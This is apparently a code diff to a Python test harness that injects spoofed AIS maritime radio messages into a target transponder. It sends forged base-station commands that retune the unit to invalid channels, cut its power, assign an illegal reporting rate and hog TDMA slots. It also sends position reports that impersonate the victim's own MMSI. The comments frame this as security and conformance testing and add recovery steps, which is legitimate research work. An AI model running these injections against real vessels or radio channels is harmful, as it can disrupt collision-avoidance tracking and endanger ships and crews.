@@ -142,6 +142,17 @@ def build_timeline(ctx):
         [(enc.encode_type1(366100000 + i, vlat + 0.01*i, vlon + 0.01*(i % 3), sog=5.0),
           f"fleet {i}") for i in range(6)]))
 
+    # --- own-MMSI echo: transmit a Type 1 whose SOURCE MMSI is the victim's OWN MMSI, but
+    # at a clearly different position (30 km NE) and a distinctive SOG, to test whether the
+    # unit misfiles received own-MMSI RF traffic as its OWN data (AIVDO) on the serial
+    # presentation port -- i.e. the RF receive path leaking into the own-ship channel.
+    # The distinct position is what lets the analyzer separate this from the unit's genuine
+    # AIVDO reports of its real (fed) position. A conforming unit should treat it as "other"
+    # (AIVDM) or flag an MMSI conflict; emitting AIVDO here would be a real contamination bug.
+    tl.append(("own_mmsi_echo",
+        [(enc.encode_type1(V, *offset_position(vlat, vlon, 45, 30000), sog=40.0, cog=225.0),
+          f"Type1 spoofing the victim's OWN MMSI {V} at a distinct position (30km NE)")]))
+
     # --- command / control (addressed to the victim) ---
     tl.append(("interrogation",
         [(enc.encode_type15(366000001, V, msg1_1=5), f"M15 interrogate victim {V}")]))
@@ -207,16 +218,22 @@ def build_phase2(ctx):
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
     p2 = []
 
+    # ENCODER CHOICE: well-formed management commands and every RECOVERY go through the
+    # pyais-validated p3enc (single validated code path, and a recovery that is guaranteed
+    # spec-correct so a successful retune is always reversible). The frequency sweep below
+    # deliberately targets out-of-range channel numbers (0, 4095) that a spec-strict encoder
+    # refuses to emit, so it must use the hand-rolled enc.encode_type22 -- which now frames
+    # the addressed flag correctly (bit 139) after the ais_encode.py fix, verified by its
+    # pyais round-trip self-test.
+
     # 1) power mode change, sent AS A BASE STATION (source-authority test)
     p2.append(("p2_power_as_base",
-        [(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
-                            power=1, addressed=1, dest1=V),
+        [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=1),
           "M22 from BASE: set DY to LOW power")]))
 
     # 2) switch AIS channels (tell DY to swap A/B) from a base station
     p2.append(("p2_channel_swap",
-        [(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_B, channel_b=AIS_CH_A,
-                            addressed=1, dest1=V),
+        [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_B, channel_b=AIS_CH_A),
           "M22 from BASE: swap DY channels A<->B")]))
 
     # 3) FREQUENCY SWEEP: try to move DY to several different channels, from a base
@@ -237,28 +254,29 @@ def build_phase2(ctx):
         (4095, "channel 4095 (max 12-bit, invalid)"),
     ]
     for chan, label in sweep_targets:
+        # retune target uses the permissive encoder (must be able to emit invalid channels)
         p2.append((f"p2_retune_ch{chan}",
             [(enc.encode_type22(BASE_MMSI, channel_a=chan, channel_b=chan,
                                 addressed=1, dest1=V),
               f"M22 from BASE: retune DY to channel {chan} [{label}]")]))
-        # recovery: immediately command DY back to normal AIS channels
+        # recovery uses the pyais-validated encoder so restoring the unit never depends
+        # on the hand-rolled path being correct
         p2.append((f"p2_recover_after_ch{chan}",
-            [(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
-                                addressed=1, dest1=V),
+            [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B),
               "M22 from BASE: RECOVERY -> restore DY to AIS channels 2087/2088")]))
 
     # 4) illegal reporting rate vs speed: GPS is set FAST (handled in main by moving
     #    the victim), but we ASSIGN a slow report interval via M16 -> non-compliant.
     #    (ITU-R M.1371 requires faster reporting at higher speed; this violates it.)
     p2.append(("p2_illegal_rate_for_speed",
-        [(enc.encode_type16(BASE_MMSI, V, offset_a=0, increment_a=1125),
+        [(p3enc.m16_assignment(BASE_MMSI, V, offset=0, increment=1125),
           "M16 from BASE: assign SLOW rate while DY moves FAST (illegal combo)")]))
 
     # 5) timing / slot overload -- reserve large slot blocks (FATDMA hogging)
     p2.append(("p2_slot_overload",
-        [(enc.encode_type20(BASE_MMSI, offset1=0, slots1=15, timeout1=7, increment1=0),
+        [(p3enc.m20_datalink(BASE_MMSI, offset=0, number=15, timeout=7, increment=0),
           "M20 from BASE: reserve 15 slots (max block)"),
-         (enc.encode_type20(BASE_MMSI, offset1=200, slots1=15, timeout1=7),
+         (p3enc.m20_datalink(BASE_MMSI, offset=200, number=15, timeout=7),
           "M20 from BASE: reserve 15 more slots")]))
 
     # 6) TDMA disruption via injected M1 with manipulated comm-state claiming slots,
@@ -419,7 +437,14 @@ def main():
                 if any(c not in "01" for c in bits):
                     rec(event="skip_bad", name=name, meta=meta); continue
                 ws.send(bits)
-                rec(event="sent", name=name, rep=r, meta=meta, bits_len=len(bits))
+                # Record the injected message's source MMSI + type so the analyzer can
+                # match each send against the listener VHF capture and self-calibrate the
+                # attacker<->listener clock offset from shared events (no NTP trust needed).
+                # Every AIS payload begins: type(6) | repeat(2) | source MMSI(30).
+                mtype = int(bits[0:6], 2) if len(bits) >= 6 else None
+                src_mmsi = int(bits[8:38], 2) if len(bits) >= 38 else None
+                rec(event="sent", name=name, rep=r, meta=meta, bits_len=len(bits),
+                    src_mmsi=src_mmsi, mtype=mtype)
                 print(f"      -> {meta}")
                 time.sleep(0.8)
         rec(event="attack_end", name=name)
@@ -462,11 +487,15 @@ def main():
                         time.sleep(args.phase2_gap)
 
             # final safety recovery: no matter what, end by restoring AIS channels + power
+            # + clearing any rate assignment. Uses the pyais-validated encoder so recovery
+            # never depends on the hand-rolled path.
             print("    final recovery: restoring DY to AIS channels 2087/2088, high power")
             for _ in range(3):
-                ws.send(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
-                                          power=0, addressed=1, dest1=args.victim_mmsi))
-                rec(event="final_recovery", meta="restore AIS channels + high power")
+                ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
+                                          channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
+                ws.send(p3enc.m16_assignment(BASE_MMSI, args.victim_mmsi,
+                                             offset=0, increment=0))
+                rec(event="final_recovery", meta="restore AIS channels + high power + rate")
                 time.sleep(1)
 
         # ---- phase 3: source-authority matrix (base vs regular per command) ----
